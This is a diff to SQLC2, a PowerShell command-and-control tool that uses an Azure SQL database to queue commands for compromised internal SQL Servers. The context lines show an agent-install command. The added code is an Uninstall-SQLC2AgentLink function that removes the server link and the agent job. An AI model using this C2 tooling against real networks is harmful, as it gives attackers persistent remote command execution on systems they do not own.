@@ -18,7 +18,7 @@
 
 	    3. Create a SQL server databse. In this example the server will be named sqlcloudc2 and the datatabase will be named database1.
 
-	    4. Add a virtual firewall exception for the target networks that you will be receiving connections from.
+	    4. Add a virtual firewall exception for the target networks that you will be receiving connections from. Traffic will come inbound over port 1433.
 
 	    ----------------------------
 	    Attack Workflow Overview
@@ -58,6 +58,10 @@
 	    5. Execute queued commands via SQL Server link and agent job. This allows you to use an internal SQL Server as your agent.	This requires sysadmin privileges on the internal SQL Server.	
 	    
 	    Install-SQLC2AgentLink -Instance 'InternalSQLServer1\SQLSERVER2014' -C2Username 'CloudAdmin' -C2Password 'CloudPassword!' -C2Instance sqlcloudc2.database.windows.net -C2Database database1 -Verbose 	
+	    
+	    Note:  You can use the command below to remove the server link agent.
+	    
+	    Uninstall-SQLC2AgentLink  -Verbose -Instance 'InternalSQLServer1\SQLSERVER2014'
 
 	    6. View command results.
 
@@ -800,6 +804,7 @@ Function Install-SQLC2Server
         # $TblResults
     }
 }
+
 
 # ----------------------------------
 #  Install-SQLC2AgentLink - In Progress
@@ -2201,6 +2206,123 @@ Function Remove-SQLC2Agent
         # Setup query to grab commands        
         $Query = "DELETE FROM dbo.C2AGENTS
                   $ServerFilter"
+
+        # Execute Query
+        $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -Database $Database -SuppressVerbose 
+    }
+
+    End
+    {
+        Write-Verbose "$instance : Done."
+    }
+ }
+
+
+
+
+# ----------------------------------
+#  Uninstall-SQLC2AgentLink
+# ----------------------------------
+# Author: Scott Sutherland
+Function Uninstall-SQLC2AgentLink
+{
+    <#
+            .SYNOPSIS
+            This command removes the C2 server link and agent job from the agent SQL Server. 
+            .PARAMETER Username
+            SQL Server or domain account to authenticate with.
+            .PARAMETER Password
+            SQL Server or domain account password to authenticate with.
+            .PARAMETER Credential
+            SQL Server credential.
+            .PARAMETER Instance                              
+            .EXAMPLE
+            PS C:\> Uninstall-SQLC2Agent -Verbose -Instance "SQLServer1\STANDARDDEV2014" -Username sa -Password 'MyPassword123!'
+            .EXAMPLE
+            PS C:\> Uninstall-SQLC2Agent -Verbose -Instance "SQLServer1\STANDARDDEV2014"
+    #>
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'SQL Server or domain account to authenticate with.')]
+        [string]$Username,
+
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
+        [string]$Password,
+
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'Windows credentials.')]
+        [System.Management.Automation.PSCredential]
+        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
+
+        [Parameter(Mandatory = $false,
+                ValueFromPipelineByPropertyName = $true,
+        HelpMessage = 'SQL Server instance to connection to.')]
+        [string]$Instance,
+
+        [Parameter(Mandatory = $false,
+        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
+        [switch]$SuppressVerbose
+    )
+
+    Begin
+    {
+        # Create data tables for output
+        $TblResults = New-Object -TypeName System.Data.DataTable
+
+        if($ServerName){
+            $ServerFilter = "WHERE servername like '$ServerName'"
+        }else{
+            $ServerFilter = ""
+        }
+    }
+
+    Process
+    {
+        # Parse computer name from the instance
+        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
+
+        # Default connection to local default instance
+        if(-not $Instance)
+        {
+            $Instance = $env:COMPUTERNAME
+        }
+
+        # Test connection to instance
+        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
+            $_.Status -eq 'Accessible'
+        }
+        if($TestConnection)
+        {
+            if( -not $SuppressVerbose)
+            {
+                Write-Verbose -Message "$Instance : Connection Success."
+                Write-Verbose "$instance : Attempting to remove the C2 link agent on $Instance."
+            }
+        }
+        else
+        {
+            if( -not $SuppressVerbose)
+            {
+                Write-Verbose -Message "$Instance : Connection Failed."
+            }
+            return
+        }     
+        
+        # Setup query to grab commands        
+        $Query = "
+                -- Remove server link to SQL C2 Server
+                IF (SELECT count(*) FROM master..sysservers WHERE srvname = 'SQLC2Server') = 1
+	                exec sp_dropserver 'SQLC2Server', 'droplogins';  
+                else
+	                select 'The server link does not exist.' 
+
+			    -- Remove C2 agent job
+                IF (SELECT count(*) FROM [msdb].[dbo].[sysjobs] job WHERE name like 'SQLC2 Agent Job') = 1
+	                EXEC msdb..sp_delete_job  @job_name = N'SQLC2 Agent Job' ;   
+                else
+	                select 'The agent job does not exist.'"
 
         # Execute Query
         $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -Database $Database -SuppressVerbose 
